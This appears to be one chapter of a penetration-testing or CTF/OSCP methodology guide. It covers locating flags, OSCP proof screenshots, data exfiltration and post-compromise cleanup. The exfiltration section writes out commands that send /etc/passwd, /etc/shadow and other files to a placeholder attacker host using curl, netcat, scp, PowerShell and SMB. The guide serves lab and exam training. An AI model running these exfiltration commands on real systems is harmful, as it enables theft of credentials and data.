# 🏆 Phase 11 — Objective Hunting

> **Finding flags and proving compromise.** The final step that validates your work.

---

## Table of Contents
- [Flag Locations — Linux](#flag-locations--linux)
- [Flag Locations — Windows](#flag-locations--windows)
- [Proof Screenshots (OSCP)](#proof-screenshots-oscp)
- [Data Exfiltration](#data-exfiltration)
- [Post-Compromise Cleanup](#post-compromise-cleanup)

---

## Flag Locations — Linux

- [ ] **Standard CTF flag names**:
  ```bash
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  find / -name "flag.txt" 2>/dev/null
  find / -name "*.flag" 2>/dev/null
  find / -name "*flag*" 2>/dev/null
  ```
- [ ] **Hidden files** (dot files):
  ```bash
  find / -name ".*flag*" 2>/dev/null
  ls -la /root/
  ls -la /home/*/
  ```
- [ ] **Non-obvious locations**:
  ```bash
  cat /root/root.txt
  cat /home/<user>/user.txt
  find /opt /srv /var /tmp /dev/shm -name "*.txt" 2>/dev/null
  find /var/www -name "*.txt" 2>/dev/null
  ```
- [ ] **In databases**:
  ```sql
  SELECT * FROM information_schema.tables WHERE table_name LIKE '%flag%';
  SELECT * FROM flags;
  ```
- [ ] **In memory / process environments**:
  ```bash
  strings /proc/*/environ 2>/dev/null | grep -i flag
  ```

---

## Flag Locations — Windows

- [ ] **Standard locations**:
  ```cmd
  type C:\Users\<user>\Desktop\user.txt
  type C:\Users\Administrator\Desktop\root.txt
  type C:\Documents and Settings\Administrator\Desktop\root.txt
  ```
- [ ] **Search the whole drive**:
  ```cmd
  dir /s /b C:\*user.txt* 2>nul
  dir /s /b C:\*root.txt* 2>nul
  dir /s /b C:\*flag* 2>nul
  ```
- [ ] **PowerShell search**:
  ```powershell
  Get-ChildItem -Path C:\ -Recurse -Include "*.txt" -ErrorAction SilentlyContinue | 
    Where-Object { $_.Name -match "flag|root|user" }
  ```

---

## Proof Screenshots (OSCP)

For OSCP, every machine needs:

### Linux Machines

```bash
# Both of these in one screenshot:
hostname && whoami && id && cat /root/proof.txt && ip a
```

Required in screenshot:
- `hostname` — shows machine name
- `id` — confirms you are root (uid=0)
- `cat /root/proof.txt` — shows the flag
- `ip a` or `ifconfig` — shows the IP address of the machine

### Windows Machines

```cmd
REM All in one screenshot:
hostname & whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig
```

Required in screenshot:
- `hostname` — machine name
- `whoami` — confirms `NT AUTHORITY\SYSTEM` or `Administrator`
- `type <flag_path>` — flag content visible
- `ipconfig` — IP address visible

> **⚠️ OSCP CRITICAL:** Without IP address in the screenshot, the proof may not be accepted. Always include `ip a` / `ipconfig` in every screenshot.

---

## Data Exfiltration

### Linux

- [ ] **Python HTTP server**:
  ```bash
  # On attacker — receive files
  python3 -m http.server 8001    # or use uploadserver

  # On target — push file
  curl -X POST http://<attacker>:8001/ -F "file=@/etc/passwd"
  ```
- [ ] **Netcat file transfer**:
  ```bash
  # Attacker receives:
  nc -nvlp 4444 > exfil_file

  # Target sends:
  nc <attacker_ip> 4444 < /etc/shadow
  ```
- [ ] **Base64 copy-paste**:
  ```bash
  # Target — encode and print
  base64 /root/root.txt
  # Copy the output, paste on attacker and decode:
  echo "<base64>" | base64 -d
  ```
- [ ] **SCP** (if SSH available from target):
  ```bash
  scp /etc/shadow <attacker_user>@<attacker_ip>:/tmp/shadow
  ```

### Windows

- [ ] **PowerShell POST**:
  ```powershell
  Invoke-WebRequest -Uri http://<attacker>:8001/ -Method POST -Body (Get-Content C:\file.txt)
  ```
- [ ] **SMB share**:
  ```bash
  # Attacker — start SMB server
  python3 smbserver.py share . -smb2support -username user -password pass
  
  # Target — copy to share
  copy C:\file.txt \\<attacker_ip>\share\
  ```
- [ ] **certutil base64**:
  ```cmd
  certutil -encode C:\file.txt C:\encoded.txt
  type C:\encoded.txt
  # Copy to attacker and decode:
  certutil -decode encoded.txt decoded_file
  ```

---

## Post-Compromise Cleanup

> **In CTF/HTB/THM**, cleanup is usually not required — reset the machine.  
> **In OSCP exam**, you generally don't need to clean up either.  
> **In real engagements**, always clean up everything you added.

- [ ] **Remove uploaded tools/shells**:
  ```bash
  rm /tmp/linpeas.sh /tmp/shell.php /dev/shm/pspy64
  ```
- [ ] **Remove created accounts**:
  ```bash
  # Linux
  userdel -r backdoor
  
  # Windows
  net user backdoor /delete
  ```
- [ ] **Remove persistence mechanisms**:
  ```bash
  # Remove crontab entries
  crontab -e   # manually remove
  
  # Remove systemd service
  systemctl disable backdoor.service
  rm /etc/systemd/system/backdoor.service
  ```
  ```cmd
  REM Remove registry key
  reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /f
  
  REM Remove scheduled task
  schtasks /delete /tn "WindowsUpdate" /f
  ```
- [ ] **Kill background processes**:
  ```bash
  kill <pid>    # Kill listeners, scanners
  ```
- [ ] **Document everything** — what you uploaded, what you changed, what backdoors you placed

---

## 🔗 References

- [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632)
- [HackTricks — Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)

---

*[← Persistence](../10_persistence/README.md) · [Back to Main](../README.md) · [Quick Reference →](../quick_reference/cheatsheets.md)*
